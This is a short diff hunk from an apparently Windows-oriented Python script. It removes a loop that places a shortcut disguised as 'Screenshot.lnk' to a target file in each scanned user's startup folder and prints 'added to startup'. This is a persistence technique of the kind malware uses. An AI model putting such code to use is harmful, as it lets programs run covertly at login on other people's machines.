@@ -27,7 +27,3 @@ def create_shortcut(target_path, shortcut_path):
 
 def main(target_file_path):
     list_dir = scan_dir()
-    for i in list_dir :
-        create_shortcut(target_file_path, i+"Screenshot.lnk")
-        user = i.split('\\',3)[2]
-        print(f"added to startup (user: {user})")
